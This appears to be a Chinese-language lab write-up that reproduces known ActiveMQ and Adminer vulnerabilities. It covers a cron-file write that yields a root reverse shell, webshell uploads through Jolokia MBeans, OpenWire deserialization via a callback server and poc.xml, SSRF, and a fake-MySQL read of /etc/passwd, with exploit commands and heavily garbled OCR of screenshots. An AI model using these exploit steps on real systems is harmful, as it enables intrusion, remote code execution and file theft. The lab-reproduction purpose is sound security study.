<!-- 这是一张图片，ocr 内容为：3X 2 X 4X X CANCEL SEND RESPONSE REQUEST PRETTY ACTIONS PRETTY RAW RENDER RAW ACTIONS HTTP/1.1 204 NO CONTENT 1234 MOVE /FILESERVER/2.TXT HTTP/1.1 2 DESTINATION:FILE://ETC/CRON.D/ROOT CONNECTION:CLOSE SERVER:JETTY(8.1.16.V20140903) 345 HOST:192.168.254.134:8161 USER-AGENT:MOZILLA/5.0 (X11; LINUX X86_64; RV:109.0) GECKO/20100101 FIREFOX/115.0 5ACCEPT: TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XML;Q-0.9 IMAGE/AVIF,IMAGE/WEBP,*/*;Q.8 67 ACCEPT-LANGUAGE:EN-US,EN;Q.5 ACCEPT-ENCODING:GZIP,DEFLATE 8 RE REFERER:HTTP://192.168.254.134:8161/ 9 AUTHORIZATION: BASIC YWRTAW46YWRTAW4; 10 CONNECTION:CLOSE COOKIE: JSESSIONID-LMCCE7Z1CN8ML166MYDN4H2U5M 11 UPGRADE-INSECURE-REQUESTS: 1 12 13 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803201645-2b801381-73ab-4ced-ad15-4a4213e2a25f.png)

<font style="color:#1f2328;background-color:#FFFFFF;">如果上述两个请求都返回204了，说明写入成功。等待反弹shell：</font>

<!-- 这是一张图片，ocr 内容为：1 -P 21 NC /BIN/SH:0:CAN'T  JOB TTY, TURNED OFF CONTROL ACCESS # ID UID-0(ROOT) GID-0(ROOT) GO ) GROUPS-0(ROOT) PMD /ROOT # -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803201742-676a7455-96a8-4d6c-bd62-8e4ac81894f4.png)

<font style="color:#1f2328;background-color:#FFFFFF;">这个方法需要ActiveMQ是root运行，否则也不能写入cron文件。</font>

# <font style="color:#1f2328;background-color:#FFFFFF;">Apache ActiveMQ Jolokia </font><font style="color:#1f2328;background-color:#FFFFFF;">后台远程代码执行漏洞（</font><font style="color:#1f2328;background-color:#FFFFFF;">CVE-2022-41678</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞环境</font>
<font style="color:#1f2328;background-color:#FFFFFF;">执行如下命令启动一个Apache ActiveMQ 5.17.3服务器：</font>

<font style="color:#1f2328;background-color:#FFFFFF;">服务启动后，访问</font><font style="color:#1f2328;">http://your-ip:8161/</font><font style="color:#1f2328;background-color:#FFFFFF;">后输入账号密码</font><font style="color:#1f2328;">admin</font><font style="color:#1f2328;background-color:#FFFFFF;">和</font><font style="color:#1f2328;">admin</font><font style="color:#1f2328;background-color:#FFFFFF;">，即可成功登录后台。</font>

## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞复现</font>
<font style="color:#1f2328;background-color:#FFFFFF;">首先，访问</font><font style="color:#1f2328;">/api/jolokia/list</font><font style="color:#1f2328;background-color:#FFFFFF;">这个</font><font style="color:#1f2328;background-color:#FFFFFF;">API</font><font style="color:#1f2328;background-color:#FFFFFF;">可以查看当前服务器里所有的</font><font style="color:#1f2328;background-color:#FFFFFF;">MBeans</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

<!-- 这是一张图片，ocr 内容为：WINDOW PROJECT HELP BURP REPEATER INTRUDER TARGET PROJECT OPTIONS EXTENDER DECODER COMPARER USER OPTIONS INTRUDER DASHBOARD PROXY REPEATER SEQUENCER TARGET:HTTP://192.168.254.134:8161 SEND CANCEL RESPONSE REQUEST PRETTY PRETTY RAW RENDER INACTIONS ACTIONS RAW GET /API/JOLOKIA/LIST HTTP/1.1 1 HTTP/1.1  200 OK 20 HOST: 192.168.254.134:8161 CONNECTION:CLOSE 3 DI USER-AQENT:MOZILLA/5.0 (X11; LINUX X86 64; RV:109.0) GECKO/20100101 DATE:SAT,22 JUN 2024 07:39:54 GMT 4 X-FRAME- OPTIONS: SAMEORIGIN FIREFOX/115.0 5 X-XSS-PROTECTION:1; MODE-BLOCK 4ACCEPT: 6X-CONTENT-TYPE-OPTIONS:NOSNIFF TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XML:Q-0.9,IMAGE/AVIF,IMAGE/WEBP 7 CONTENT-TYPE:TEXT/PLAIN;CHARSETF-8 ,*/*:G-0.8 8 CACHE-CONTROL: NO-CACHE 5 ACCEPT-LANGUAGE: EN-US,EN;Q.5 9PRAGMA:NOCACHE ACCEPT-ENCODING:GZIP,DEFLATE   REFER:HTTP://192.168.254.134:8161/ 10 EXPIRES: SAT, 22 JUN 2024 06:39:54 GMT T1 BASI C YWRTAW46YWRTAW4 AUTHORIZATION:BA 12("REQUEST':{"TYPE":'LIST"],"VALUE":{'JMIMIMPLEMENTATION":[*TYPE-MBEANSER CONNECTION:CLOSE VERDELEGATEL":{"ATTR":["IMPLEMENTATIONNAME":I"RW":FALSE,"TYPE":"JAVA.LA COOKIE: JSESSIONID-NODEOPOF VX4X7JESD5VTIWF2OPFDVO.NODEO NG.STRING","DESC':"THE JMX IMPLEMENTATION NAME (THE NAME OF THIS UPGRADE-INSECUREQUESTS:1 PRODUCT)"了,"MBEANSERVERID":["RW":FALSE,"TYPE":"JAVA.LANG.STRING","DESC "THE MBEAN SERVER AGENT [IDENTIFICATION"},"IMPLEMENTATIONVERSION':{"RW':FALSE,"TYPE":"JAVA.LANG -STRING","DESC":"THE JMX IMPLEMENTATION VERSION (THE VERSION OF THIS PRODUCT)."},"SPECIFICATIONVERSION':['RW':FALSE,"TYPE":"JAVA.LANG.STRIN G","DESC":WTHE VERSION OF THE JMX SPECIFICATION IMPLEMENTED BY THIS PRODUCT."SPECIFICATIONVENDOR":["RW":["RW":FALSE,"TYPE":"JAVA.LANG.STRING" -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803574732-3f5222ad-34a4-47d1-b6bf-482625113f32.png)

<font style="color:#1f2328;background-color:#FFFFFF;">这其中有两个可以被用来执行任意代码。</font>

## <font style="color:#1f2328;background-color:#FFFFFF;">方法</font><font style="color:#1f2328;background-color:#FFFFFF;">1</font>
<font style="color:#1f2328;background-color:#FFFFFF;">第一个方法是使用</font><font style="color:#1f2328;">org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean</font><font style="color:#1f2328;background-color:#FFFFFF;">，这是由</font><font style="color:#1f2328;background-color:#FFFFFF;">Log4j2</font><font style="color:#1f2328;background-color:#FFFFFF;">提供的一个</font><font style="color:#1f2328;background-color:#FFFFFF;">MBean</font><font style="color:#1f2328;background-color:#FFFFFF;">。</font>

<font style="color:#1f2328;background-color:#FFFFFF;">攻击者使用这个</font><font style="color:#1f2328;background-color:#FFFFFF;">MBean</font><font style="color:#1f2328;background-color:#FFFFFF;">中的</font><font style="color:#1f2328;">setConfigText</font><font style="color:#1f2328;background-color:#FFFFFF;">操作可以更改</font><font style="color:#1f2328;background-color:#FFFFFF;">Log4j</font><font style="color:#1f2328;background-color:#FFFFFF;">的配置，进而将日志文件写入任意目录中。</font>

<font style="color:#1f2328;background-color:#FFFFFF;">使用</font>[poc](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2022-41678/poc.py#tdsub)<font style="color:#1f2328;background-color:#FFFFFF;">脚本来复现完整的过程：</font>

<!-- 这是一张图片，ocr 内容为：-(KALISKALI)-[~/DESKTOP/VULHUB-MASTER/ACTIVEMQ/CVE-2022-41678) -U ADMIN -P ADMIN HT N HTTP://192.168.254.134:8161 PYTHON3 POC.PY 16:06:06,443 INFO 2024-06-22 CHOICE MBEAN 'ORG.APACHE.LOGGING.LOG4J2:TYPE AUTOMATICALLY 5FAEADA1' A 2023-12-01 2024-06-22 16:06:06,590 INFO UPDATE LOG CONFIG 2024-06-22 16:06:06,628 INFO WRITE WEBSHELL TO HTTP://192.168.254.134:816 1/ADMIN/SHELL.JSP?CMD-ID 2023-12-01 LOG CONFIG 2024-06-22 16:06:06,709 INFO RESTORE -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803574595-c1680945-4e50-4e6e-aae1-dbb39981f01b.png)

<font style="color:#333333;">Webshell被写入在/admin/shell.jsp文件中：</font>

<!-- 这是一张图片，ocr 内容为：力 女 192.168.254.134:8161/ADMIN/SHELL.JSP?CMD ID EXPLOIT-DB KALI DOCS MSFU NETHUNTER KALI FORUMS KALI TRAINING OFFENSIVE SECURITY OTHER BOOKMARKS KALI LINUX KALI TOOLS /S- KOOKOOKOOKOOKOOKOOKOOKOOH  OR 03 06   DEBUG HEDEOMINECTESSO0EDECTE:SORKENNAENERUMTRUNTERIES1EA732223222318181-IC/193 130370707070. FUAL-,FUSH-, T /30000~-110-0/0,KIO-0,KRO-1}->HTTPCONNECTION@5600E044[P-HTTPPARSERFS-STARTO OF OS-OPEN IS-IDLE AWP-FALSE SO-FALSEI-TRUE AL-01-01,3-2.C-FALSE,A-IDLE,A-IDLE,URI-NULL,FLLED 353 HEAPBYTEBUFFER@3A9BE57E/P-0.1-353,C-8192,T-353]-{<>>1/ADMIN/S" XOOXOOXOOXOOXOOXOOXOOXOOXOOXOO] ORG.ECLIPSE,JETTY,SERVER HTTPCONNECTION | GTP2440443-59 2024-06-22 08:06:203 | DEBUG /3000-FIO-0/0,KIO-O,KRO-1}->HTTPCONNECTION@S600E044TP-HTTPPARSER(S-START;O OF OS-OPEN IS-IDLE AWP-FALSE SE-FALSE I-TRUE ALFO;:[-Z,C三-Z,C三FALSE,A-IDLE,UIL A9E-NUL,A9E-OF PARSE HEAPBYTEBUFFERQ3A9FE57C[P-0.L-353,C-8192,R-353/-{<>>1/ADMIN/S..KOOXOOXOOXOOXOOXOOXOOXOOXOOXOOXOOXOOXO /L92,16B 254.1348LABIRDIOLOHAVERVERSON HTTPL, 192,168 25413131-816L ACCEPT-ENCODING:IDENTI NGALLE LLID-OLROOD)GID-OFROOF)GROUPS-OFROOT)/LL ORIGIN;HTTP://192 134:8161 AUTHORIATION: BASIC YWRTAWE- [ORG.ECHPSEJETTY,SERVER.HTTPCHANNEL| QTP2440443-59 2024-06-22 08:06:06:212| DEBUG| /30000HFIO-0/0.KRO-0.KRO-11->HTTPCONNECTION@5600E044LD-HTTPPARSERFS-CONTENT:O OF I TELEASEREQUESTBUFER HLUPCONNECTONO5600E0年4;SOCKETCHANNELENDPBINTEL,T- /192.168.254.130:37070,OPEN,FLL--,FLUSH--,TO-10/3000 FIO-0/0,KIO-O,KRO-1}>HTTPCONNECTION@5600E044[P-HTTPPARSERFS-CONTENTO OF 213  DEBUG | HANDLE //192.168.254.134:8161/API/IOLOKIA ORG.ECLIPSEJETTY,SERVER.HTTPCONNECTION | QTP2440443-59 2024-06-22 08:06:06,213 MOZILLA HIGHLIGHT ALL MATCH DIACRITICS WHOLE WORDS 1 OF 2 MATCHES MATCH CASE -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803575179-459b7ab3-5462-4da6-9e9f-f10d4504662f.png)

<font style="color:#333333;">这个方法受到</font><font style="color:#333333;">ActiveMQ</font><font style="color:#333333;">版本的限制，因为</font><font style="color:#333333;">Log4j2</font><font style="color:#333333;">是在</font><font style="color:#333333;">5.17.0</font><font style="color:#333333;">中才引入</font><font style="color:#333333;">Apache ActiveMQ</font><font style="color:#333333;">。</font>

## <font style="color:#1f2328;background-color:#FFFFFF;">方法</font><font style="color:#1f2328;background-color:#FFFFFF;">2</font>
<font style="color:#1f2328;background-color:#FFFFFF;">第二个可利用的</font><font style="color:#1f2328;background-color:#FFFFFF;">Mbean</font><font style="color:#1f2328;background-color:#FFFFFF;">是</font><font style="color:#1f2328;">jdk.management.jfr.FlightRecorderMXBean</font><font style="color:#1f2328;background-color:#FFFFFF;">。</font>

<font style="color:#1f2328;background-color:#FFFFFF;">FlightRecorder</font><font style="color:#1f2328;background-color:#FFFFFF;">是在</font><font style="color:#1f2328;background-color:#FFFFFF;">OpenJDK 11</font><font style="color:#1f2328;background-color:#FFFFFF;">中引入的特性，被用于记录</font><font style="color:#1f2328;background-color:#FFFFFF;">Java</font><font style="color:#1f2328;background-color:#FFFFFF;">虚拟机的运行事件。利用这个功能，攻击者可以将事件日志写入任意文件。</font>

<font style="color:#1f2328;background-color:#FFFFFF;">使用</font>[poc](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2022-41678/poc.py#tdsub)<font style="color:#1f2328;background-color:#FFFFFF;">脚本来复现完整的过程（使用</font><font style="color:#1f2328;">--exploit</font><font style="color:#1f2328;background-color:#FFFFFF;">参数指定使用的方法）：</font>

<!-- 这是一张图片，ocr 内容为：-(KALISKATI)-[~/DESKTOP/VULHUB-MASTER/ACTIVEMQ/CVE-2022-41678) 5,EN:Q-0.5 -EXPLOIT JFR HTTP://192.168.254.134:816 ADMIN ADMIN PYTHON3 -U -P POC.PY 1 WEBSOCKET-VERSION: CHOICE MBEAN JDK.MANAGEMENT.JFR:TYPE-FLIGHTR 16:12:55,653 2024-06-22 INFO ECORDER MANUALLY /XW9X9DQ6MUFHMC SEC- 2024-06-22 16:12:56,442 FO - CREATE FLIGHT RECORD,ID ;1 INFO 2024-06-22 16:12:56,478 FOR RECORD 1 INFO - UPDATE CONFIGURATION 2024-06-22 16:12:56,825 INFO START RECORD 2024-06-22 16:12:57,856 INFO STOP RECORD WRITE WEBSHELL TO HTTP://192.168.254.134:816 2024-06-22 16:12:57,871 INFO 1/ADMIN/SHELLJFR.JSP?CMD-ID -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803574862-e9a5fde5-b8d2-474b-ace3-1f34f52f2763.png)

<font style="color:#1f2328;background-color:#FFFFFF;">Webshell</font><font style="color:#1f2328;background-color:#FFFFFF;">被写入在</font><font style="color:#1f2328;">/admin/shelljfr.jsp</font><font style="color:#1f2328;background-color:#FFFFFF;">文件中：</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.134:8161/ADMIN/SHELLJFR.JSP?CMDID OFFENSIVE SECURITY OTHER BOOKMARKS KALI FORUMS NETHUNTER EXPLOIT-DB KALI DOCS MSFU KALI LINUX KALI TRAINING KALI TOOLS THREATO MSEXPES(FERABERALEEFFA SENKTTERTOLEERABERSTOLE THRESTOLD MSIKOEBREENABLEDTMONK-OB'E STACKTRACKTRACKTRACKEANAHLETTMENTERTRNENTE STACKTREERABEDTASSAST TNAKINCHUNEROD  PESUCHUAKEE "BENABERABERK INPEROD BEGUNCHUNKKOF INERAKLETTNEX'  1(OPERINCHUNKKEB 10 ENABLEDMEKIB "IOPEROD BEGMCHUNKIKE  10ENABLEDTMEKAN  ROPERTOD BEGINCHUNKKARKARLEDTRNEAK'A  10PERTOD (DENABLEDRNEEK-A   (UPERIODIOOO MSIKIC  'UENABLEDTRUEEKOE   VUPERRODLOOD MSIKE 'LXENTRUAKAL  (PPEROD' SIKOA (UENABLEDTRUE LUID-0(ROOT)GID-O(ROOT) GROUPS-O(ROOT))NLIKO;U "(BENABLEDTRUEJKASP (APERIOD EVERYCHUNKIK/LI (PENABLEDTRUEAKUAN I(SPERIODE) PERODERACTINKKEAR  LCERAVESRONERON  "GPERALOOD MAKEANAYESAYESTMEKSY  LEPETOT  BEANKKHEERASEDTTUEKEAN PEROD BETMENUNKKETIMCENAJEDINEAKOUOHO  DRESHOLD MSKROOH CERALETINEERRIXHO HIESTOLO MSKASUHOERABLCC MATCH DIACRITICS UID REACHED TOP OF PAGE,CONT WHOLE WORDS MATCH CASE 1 OF 1 MATCH HIGHLIGHT ALL -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803575242-34e42bf7-ad15-4339-85c7-f376cc364a6c.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">Apache ActiveMQ OpenWire </font><font style="color:#1f2328;background-color:#FFFFFF;">协议反序列化命令执行漏洞（</font><font style="color:#1f2328;background-color:#FFFFFF;">CVE-2023-46604</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">环境搭建</font>
<font style="color:#1f2328;background-color:#FFFFFF;">ActiveMQ</font><font style="color:#1f2328;background-color:#FFFFFF;">运行后，默认监听如下两个端口：</font>

| **<font style="color:#1f2328;">默认端口</font>** | **<font style="color:#1f2328;">默认条件</font>** |
| --- | --- |
| <font style="color:#1f2328;">8161 web</font> | <font style="color:#1f2328;">需配置才可远程访问</font> |
| <font style="color:#1f2328;">61616 tcp</font> | <font style="color:#1f2328;">远程访问</font> |


<font style="color:#1f2328;background-color:#FFFFFF;">反序列化漏洞出现在</font><font style="color:#1f2328;background-color:#FFFFFF;">61616</font><font style="color:#1f2328;background-color:#FFFFFF;">端口中。</font>

<font style="color:#1f2328;background-color:#FFFFFF;">执行如下命令启动一个ActiveMQ 5.17.3版本服务器：</font>

<font style="color:#1f2328;background-color:#FFFFFF;">服务启动后，访问</font><font style="color:#1f2328;">http://your-ip:8161</font><font style="color:#1f2328;background-color:#FFFFFF;">检查服务是否运行成功。但实际上利用该漏洞，并不需要能够访问</font><font style="color:#1f2328;background-color:#FFFFFF;">8161</font><font style="color:#1f2328;background-color:#FFFFFF;">端口。</font>

## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞复现</font>
<font style="color:#1f2328;background-color:#FFFFFF;">首先，启动一个</font><font style="color:#1f2328;background-color:#FFFFFF;">HTTP</font><font style="color:#1f2328;background-color:#FFFFFF;">反连服务器，其中包含我们的</font>[poc.xml](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2023-46604/poc.xml#tdsub)<font style="color:#1f2328;background-color:#FFFFFF;">：</font>

```plain
python3 -m http.server 6666
```

<!-- 这是一张图片，ocr 内容为：-KALI)-KALI)-[DESKTOP/VU P/VULHUB-MASTER/ACTIVEMQ/CVE-2023-46604 HTTP.SERVER 6666 PYTHON3-M SERVING HTTP ON 0.0.0.0 PORT 6666 (HTTP://0.0.0.0:66666/) [22/JUN/2024 16:29:30] "GET /POC.XML 192.168.254.134 HTTP/1.1"200 /POC.XML HTTP/1.1" 200 'GET [22/JUN/2024 16:29:30] 192.168.254.134 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803627194-1d424129-be01-4d29-9e1f-a9ec4b582b8e.png)

<font style="color:#1f2328;background-color:#FFFFFF;">然后，执行</font>[poc.py](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2023-46604/poc.py#tdsub)<font style="color:#1f2328;background-color:#FFFFFF;">，传入的三个参数分别是目标服务器地址、端口，以及包含</font><font style="color:#1f2328;background-color:#FFFFFF;">poc.xml</font><font style="color:#1f2328;background-color:#FFFFFF;">的反连平台</font><font style="color:#1f2328;background-color:#FFFFFF;">URL</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

```plain
python3 poc.py target port http://ip of http server/poc.xml
```

<!-- 这是一张图片，ocr 内容为：(KALI@KALI)-[DESK [/DESKTOP/VULHUB-MASTER/ACTIVEMQ/CVE-2023-46604 192.168.254.134 61616 HTTP://192.168.254.130:6666/POC.XML PYTHON3 POC.PY -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803627181-a7e261c4-fcd3-4a37-acdc-66c1a39eb5f3.png)

<font style="color:#1f2328;background-color:#FFFFFF;">执行完成后，进入</font><font style="color:#1f2328;background-color:#FFFFFF;">ActiveMQ</font><font style="color:#1f2328;background-color:#FFFFFF;">容器：</font>

<font style="color:#1f2328;background-color:#FFFFFF;">可见，</font><font style="color:#1f2328;">touch /tmp/activeMQ-RCE-success</font><font style="color:#1f2328;background-color:#FFFFFF;">已经被成功执行：</font>

<!-- 这是一张图片，ocr 内容为：O DOCKER EXEC CVE-2023-46604-ACTIVEMQ-1 [CENTOS@LOCALHOST CVE-2023-46604] SUDO D LS-1/TMP TOTAL0 -RW-P--P-- 1 ROOT ROOT O JUN 22 08:29 ACTIVEMO-RCE-SUCCESS 16 JUN 22 08:23 HSPERFDATA ROOT DRWXR-XR-X 1 ROOT ROOT -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803627183-494a88e3-5b3a-4554-8278-2fab9f552052.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">Adminer ElasticSearch </font><font style="color:#1f2328;background-color:#FFFFFF;">和</font><font style="color:#1f2328;background-color:#FFFFFF;"> ClickHouse </font><font style="color:#1f2328;background-color:#FFFFFF;">错误页面</font><font style="color:#1f2328;background-color:#FFFFFF;">SSRF</font><font style="color:#1f2328;background-color:#FFFFFF;">漏洞（</font><font style="color:#1f2328;background-color:#FFFFFF;">CVE-2021-21311</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞环境</font>
<font style="color:#1f2328;background-color:#FFFFFF;">执行如下命令启动一个安装了Adminer 4.7.8的PHP服务：</font>

<font style="color:#1f2328;background-color:#FFFFFF;">服务启动后，在</font><font style="color:#1f2328;">http://your-ip:8080</font><font style="color:#1f2328;background-color:#FFFFFF;">即可查看到</font><font style="color:#1f2328;background-color:#FFFFFF;">Adminer</font><font style="color:#1f2328;background-color:#FFFFFF;">的登录页面。</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.134:8080 OFF KALI FORUMS KALI DOCS KALI TOOLS KALI TRAINING KALI LINUX NETHUNTER ENGLISH LANGUAGE: LOGIN ADMINER 4.7.8 4.8.1 SYSTEM MYSQL SERVER LOCALHOST USERNAME PASSWORD DATABASE PERMANENT LOGIN LOGIN -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803627211-1cf3e336-1b74-4a45-ab8d-cb9c61d51bb5.png)

## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞复现</font>
<font style="color:#1f2328;background-color:#FFFFFF;">在</font><font style="color:#1f2328;background-color:#FFFFFF;">Adminer</font><font style="color:#1f2328;background-color:#FFFFFF;">登录页面，选择</font><font style="color:#1f2328;background-color:#FFFFFF;">ElasticSearch</font><font style="color:#1f2328;background-color:#FFFFFF;">作为系统目标，并在</font><font style="color:#1f2328;background-color:#FFFFFF;">server</font><font style="color:#1f2328;background-color:#FFFFFF;">字段填写</font><font style="color:#1f2328;">example.com</font><font style="color:#1f2328;background-color:#FFFFFF;">，点击登录即可看到</font><font style="color:#1f2328;">example.com</font><font style="color:#1f2328;background-color:#FFFFFF;">返回的</font><font style="color:#1f2328;background-color:#FFFFFF;">400</font><font style="color:#1f2328;background-color:#FFFFFF;">错误页面展示在页面中：</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.134:8080/?ELASTIC-EXAMPLE.COM&USERNAME KALI TRAINING MSFU OFFENSIVE SECURITY KALI DOCS NETHUNTER KALI TOOLS EXPLOIT-DB KALI FORUMS OTHER KALI LINUX LANGUAGE: ENGLISH LOGIN ADMINER4.7.84.8.1 :-XML VERSION-'L.O"ENCODING--/NN3CI/7> <IDOCTYPE HML PUBLIC"/INIC -/AN3CJIDTD XHTML 1.0 TRANSTION" LANG:"EN*> CHEAD> <IILEZDOO - BAD REQUESTCLTILE> <HEAD> <BOD) <HI>400 - BAD REQUESTCHI> <BODY> <HIML> ELASTICSEARCH(BETA) SYSTEM SERVER EXAMPLE.COM USERNAME PASSWORD DATABASE PERMANENT LOGIN LOGIN -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803627237-f76126e2-f249-4dec-84f4-14bb302b2cd3.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">Adminer</font><font style="color:#1f2328;background-color:#FFFFFF;">远程文件读取（</font><font style="color:#1f2328;background-color:#FFFFFF;">CVE-2021-43008</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞环境</font>
<font style="color:#1f2328;background-color:#FFFFFF;">执行如下命令启动Web服务，其中包含Adminer 4.6.2：</font>

<font style="color:#1f2328;background-color:#FFFFFF;">服务启动后，在</font><font style="color:#1f2328;">http://your-ip:8080</font><font style="color:#1f2328;background-color:#FFFFFF;">即可查看到</font><font style="color:#1f2328;background-color:#FFFFFF;">Adminer</font><font style="color:#1f2328;background-color:#FFFFFF;">的登录页面。</font>

## <font style="color:#1f2328;background-color:#FFFFFF;">Exploit</font>
<font style="color:#1f2328;background-color:#FFFFFF;">使用</font>[mysql-fake-server](https://github.com/4ra1n/mysql-fake-server#tdsub)<font style="color:#1f2328;background-color:#FFFFFF;">启动一个恶意的</font><font style="color:#1f2328;background-color:#FFFFFF;">MySQL</font><font style="color:#1f2328;background-color:#FFFFFF;">服务器。在</font><font style="color:#1f2328;background-color:#FFFFFF;">Adminer</font><font style="color:#1f2328;background-color:#FFFFFF;">登录页面中填写恶意服务地址和用户名</font><font style="color:#1f2328;">fileread_/etc/passwd</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

<!-- 这是一张图片，ocr 内容为：HTTPS://GITHUB.COM/4RAIN/MYSQL-FAKE-SERVER/RELEASES/TAG/0.0.0.4 KALI TRAINING OFFENSIVE SECURITY KALI DOCS KALI FORUMS MSFU KALI LINUX NETHUNTER KALI TOOLS 4RAIN RELEASED THIS SEP 18,2023 0.0.4 -0 36EA990 0.0.4 支持了两种JDBC的利用: PGSQL和 DERBY APACHE 重要更新:支持了PGSQLRCE的利用SERVER ,重要更新:支持了APACHE DERBY利用SLAVE功能的RCE 优化依赖减小体积,使用更标准的MAVEN插件打包配置 修复了某些情况下日志输出的问题 ,恢复日志模式到INFO级别避免打印过多无意义信息 对UI做了一些小改善 ASSETS 8.26 MB FAKE-MYSQLI-0.0.0.4JAR 8.17 MB FAKE-MYSQL-GUI-0.0.4.JAR SOURCE CODE(ZIP) SOURCE CODE (TAR.GZ) -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803697122-b2a2e6dc-9261-4f2d-9918-9ad167ee5e11.png)

<!-- 这是一张图片，ocr 内容为：-(KALI@KALI)-[DOWNLOADS] 5 JAVA -JAR FAKE-MVSQL-CLI-0.0.4.JAR -P 33306 PICKED UP -JAVA.OPTIONS: -DAWT.USESYSTEMAAFONTSETTINGS-ON -DSWING.AATEXT:TRUE .0 BROADCAST 192.168.254.25 0 NETMASK 255.255.0 B :90CF:88EA:75D9:AC01 PREFIXLEN 64 SCOPEID 0X20<LINK>-LINK>- 9:5D:F3  TXQUELEN 1000  (ETHERNET) BYTES 1671862733 (1.5 GIB) OPPED 0VERRUNS 0 FRAME 0 BYTES 1775698827(1.6G ED O OVERRUNS O CARRIERO COLLISIONS O OPPED CK,RUNNING>  MTU 65536 NETMASK 255.0.0 LEFIXLEN 128  SCOPEID 0X10<HOST> -R TOO LUEUELEN 10000 (LOCAL LOOPBACK) FAKE MYSQL SERVER CLI 19 BVTES 26201870 (24.9 MIB) VERSION:0.0.4 OVERRUNS0FRAME0 0 DROPPED 0 #HHUNULUNHUNHUHHHIHHHHHHHHIHH#USAG USAGE ######## [PARAMS] COLLISIONS O [GADGET] DESERIALIZATION USER:DESER ROME|7U21 8U20 C3P0 URLDNS GADGET:CB CC31 CC44 EXAMPLE 1: DESER_CB_C CALC.EXE EXAMPLE 2: DESER URLDNS HTTP://YOUR-DNS-LOG  FILE USER: FILEREAD_[NAME] READ EXAMPLE 1:FILEREAD /ETC/PASSWD O)CB1.9 EXAMPLE 2:FILEREAD C:\PROGRAM FILES\SRC.ZIP ROME URLDNS SUPPORT RAW STRING AND BASE64 (START WITH BASE64) FILE READ EXAMPLE 1: USER-DESER_CB_CALC.EXE EXAMPLE 2: USER-BASE64ZGVZZXJFQOJFY2FSYY5LEGU- URSUMESTATUSDIFFLNTERCEPTOR SUPPORT CUSTOM GADGET (USE FILE) EXAMPLE:SAVE GADGET TO TEST.TXT 5.1.29-5.1.48 XT 1.28 USE: JAVA -JAR CLI.JAR -F TEST.TXT USE: DESER CUSTOM E DASE D WARNING: SUN REFLECT.REFLECTION GETCALLERCLASS IS NOT SUPPORTED. THIS WILL IM PACT PERFORMANCE. SERVER:0.0.0.0:3330 KE MYSQL 05:21:15 5 [MAIN] MYSQLSERVER.STARTSERVER START FAKE MY 9 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803697113-d0a0b428-77fe-4d86-83da-ba28921dc306.png)

<font style="color:#1f2328;background-color:#FFFFFF;">可见，我们已经收到客户端连接，读取到的文件</font><font style="color:#1f2328;">/etc/passwd</font><font style="color:#1f2328;background-color:#FFFFFF;">已保存至当前目录：</font>

<!-- 这是一张图片，ocr 内容为：T(USE FILE) GADGET( SUPPORT CUSTOM EXAMPLE: SAVE GADGET TO TEST.TXT... KAULINUX  USE: JAVA -JAR CLI.JAR -F TEST.TXT ARRIER COLLI USE:DESER CUSTOM HMNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN #知识库 WARNING: SUN REFLECT.REFLECTION GETCALLERCLASS IS NOT SUPPORTED. THIS WILL IN PACT PERFORMANCE. 05:21:15 [MAIN] MYSQLSERVER.STARTSERVER START FAKE MYSQL SERVER: 0.0.0.0:3330 6 05:23:37 [MAIN] MYSQLSERVER.STARTSERVER ACCEPT: 192.168.254.134 [THREAD-0] TASKSTARTER.RUN SEND GREETING FROM SERVER 05:23:37 TASKSTARTER.RUN USERNAME: FILEREAD_/ETC/PASSWD [THREAD-0] 05:23:37 TASKSTARTER.RUN MODE: FILE READ [THREAD-0] 05:23:37 [THREAD-0] READFILERESOLVER.RESOLVE READ FILE: /ETC/PASSWD 05:23:37 [THREAD-0] READFILERESOLVER.RESOLVE WRITE SUCCESS: 919 05:23:37 [THREAD-0] 05:23:37 READFILERESOLVER.RESOLVE FILE IS NULL [THREAD-0] READFILERESOLVER.RESOLVE READ FILE FINISH 05:23:37 MYSQLSERVER.STARTSERVER ACCEPT: 192.168.254.134 05:23:37 [MAIN] SERVER 错误页面SSRF漏洞 [THREAD-1] 